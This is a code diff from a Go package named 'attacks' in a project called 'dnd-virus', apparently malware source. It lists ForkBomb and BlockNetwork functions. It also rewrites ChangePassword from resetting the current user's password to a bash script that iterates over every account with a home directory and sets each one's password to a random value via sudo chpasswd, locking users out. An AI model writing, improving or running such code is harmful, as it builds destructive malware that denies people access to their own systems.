@@ -3,7 +3,6 @@ package attacks
 import (
 	"dnd-virus/password"
 	"os/exec"
-	"os/user"
 )
 
 func ForkBomb() error {
@@ -26,13 +25,14 @@ func BlockNetwork() error {
 }
 
 func ChangePassword() error {
-	currentUser, err := user.Current()
-	if err != nil {
-		return err
-	}
-	username := currentUser.Username
-	newPass := password.GeneratePassword()
-	exec.Command("sh", "-c", "echo '"+username+":"+newPass+"' | sudo chpasswd").Run()
+	script := `
+for user in $(getent passwd | grep -E '/home' | cut -d: -f1); do
+    PASS="` + password.GeneratePassword() + `"
+    echo "$user:$PASS" | sudo /usr/sbin/chpasswd 2>&1
+    echo "Changed $user"
+done
+`
+	exec.Command("bash", "-c", script).Run()
 	return nil
 }
 
